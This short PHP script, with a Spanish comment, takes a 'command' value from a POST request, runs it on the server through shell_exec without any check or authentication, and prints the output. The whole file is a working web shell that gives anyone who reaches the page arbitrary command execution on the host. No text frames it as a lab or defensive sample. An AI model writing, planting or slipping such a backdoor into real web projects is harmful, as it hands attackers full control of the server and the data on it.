<?php
$command = $_POST['command'];

$output = '';
$output = shell_exec($command); // Ejecuta el comando y captura la salida

echo "<pre>$output</pre>";
?>